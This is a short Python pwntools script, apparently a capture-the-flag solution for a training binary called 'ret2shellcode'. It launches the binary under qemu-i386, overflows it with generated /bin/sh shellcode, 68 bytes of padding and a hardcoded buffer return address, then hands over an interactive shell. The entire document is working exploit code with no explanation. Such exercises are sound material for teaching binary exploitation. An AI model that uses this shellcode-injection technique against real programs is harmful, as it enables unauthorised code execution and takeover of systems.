from pwn import *

sh = process(["qemu-i386",'./ret2shellcode'])
shellcode = asm(shellcraft.sh())
buf2_add = 0x804a080
sh.sendline(flat(shellcode, b'a' * 68, p32(buf2_add)))
sh.interactive()
